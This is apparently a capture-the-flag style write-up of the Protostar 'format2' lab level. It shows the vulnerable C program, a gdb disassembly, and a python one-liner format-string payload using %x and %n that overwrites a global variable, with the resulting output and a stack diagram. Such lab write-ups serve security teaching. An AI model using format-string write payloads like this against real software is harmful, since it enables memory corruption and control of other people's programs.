## FORMAT TWO ##
This level moves on from format1 and shows how specific values can be written in memory.

This level is at /opt/protostar/bin/format2
### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
We can find the *target* address in the following assembly code
```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x08048454 <vuln+0>:    push   %ebp
0x08048455 <vuln+1>:    mov    %esp,%ebp
0x08048457 <vuln+3>:    sub    $0x218,%esp
0x0804845d <vuln+9>:    mov    0x80496d8,%eax
0x08048462 <vuln+14>:   mov    %eax,0x8(%esp)
0x08048466 <vuln+18>:   movl   $0x200,0x4(%esp)
0x0804846e <vuln+26>:   lea    -0x208(%ebp),%eax
0x08048474 <vuln+32>:   mov    %eax,(%esp)
0x08048477 <vuln+35>:   call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:   lea    -0x208(%ebp),%eax
0x08048482 <vuln+46>:   mov    %eax,(%esp)              
0x08048485 <vuln+49>:   call   0x804837c <printf@plt>
0x0804848a <vuln+54>:   mov    0x80496e4,%eax               <- Our target address
0x0804848f <vuln+59>:   cmp    $0x40,%eax
0x08048492 <vuln+62>:   jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:   movl   $0x8048590,(%esp)
0x0804849b <vuln+71>:   call   0x804838c <puts@plt>
---Type <return> to continue, or q <return> to quit---
0x080484a0 <vuln+76>:   jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:   mov    0x80496e4,%edx
0x080484a8 <vuln+84>:   mov    $0x80485b0,%eax
0x080484ad <vuln+89>:   mov    %edx,0x4(%esp)
0x080484b1 <vuln+93>:   mov    %eax,(%esp)
0x080484b4 <vuln+96>:   call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:  leave
0x080484ba <vuln+102>:  ret
End of assembler dump.

```
We know that if we put a format string for *fgets* function input, we will end
up printing our stack. We can use the same strategy as in format1. However, in
this case, we need to tune the number of characters to be exactly 64. 
We also recognize that if *printf* is called with a string containing format
identifier, it will print what it contains in the stack.

```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x08048454 <vuln+0>:    push   %ebp                 
0x08048455 <vuln+1>:    mov    %esp,%ebp
0x08048457 <vuln+3>:    sub    $0x218,%esp
0x0804845d <vuln+9>:    mov    0x80496d8,%eax
0x08048462 <vuln+14>:   mov    %eax,0x8(%esp)       <- 0xb7fd8420 (stdin)
0x08048466 <vuln+18>:   movl   $0x200,0x4(%esp)     <- 0x200 or 512
0x0804846e <vuln+26>:   lea    -0x208(%ebp),%eax
0x08048474 <vuln+32>:   mov    %eax,(%esp)
0x08048477 <vuln+35>:   call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:   lea    -0x208(%ebp),%eax
0x08048482 <vuln+46>:   mov    %eax,(%esp)          <- the buffer
0x08048485 <vuln+49>:   call   0x804837c <printf@plt>
0x0804848a <vuln+54>:   mov    0x80496e4,%eax       <- our target address
0x0804848f <vuln+59>:   cmp    $0x40,%eax
0x08048492 <vuln+62>:   jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:   movl   $0x8048590,(%esp)
0x0804849b <vuln+71>:   call   0x804838c <puts@plt>
---Type <return> to continue, or q <return> to quit---
0x080484a0 <vuln+76>:   jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:   mov    0x80496e4,%edx
0x080484a8 <vuln+84>:   mov    $0x80485b0,%eax
0x080484ad <vuln+89>:   mov    %edx,0x4(%esp)
0x080484b1 <vuln+93>:   mov    %eax,(%esp)
0x080484b4 <vuln+96>:   call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:  leave
0x080484ba <vuln+102>:  ret
End of assembler dump.

```
Therefore, we can use the following command line
```
(python -c "print('AAAABBBB'  + '\xe4\x96\x04\x08' + '%x   ' * 5 + '  %n  ')"; cat) | /opt/protostar/bin/format2
AAAABBBB�200   b7fd8420   bffff5f4   41414141   42424242
you have modified the target :)
```
We can interpret the message as follow
```
AAAABBBB�200   b7fd8420   bffff5f4   41414141   42424242
                            
    ^     ^        ^          ^           ^        ^
    |     |        |          |           |        |
  string  esp+4   esp+8     esp + 12   esp+16     esp + 20
                                         where the buffer locates
```
The stack at that point is

-----------------
    0x080496e4          esp + 24
-----------------
    0x42424242 (BBBB)   esp + 20
----------------
    0x41414141 (AAAA)   esp + 16            esp = 0xbffff5b0
----------------
    bffff5f4            esp + 12            -> ??? 
----------------
    b7fd8420 (stdin)    esp + 8
----------------
    0x200 (512)         esp + 4             
----------------
    0xbffff5b0          esp                 esp = 0xbffff5a0
---------------
            
printf will print the string until it hits one identifier. At this point, it
will take the value starting from esp + 4 because at esp, it's supposed to be
the format string. That's the reason why we got the value above. The trick in
this task is to tune the input also accounting the number of spaces.

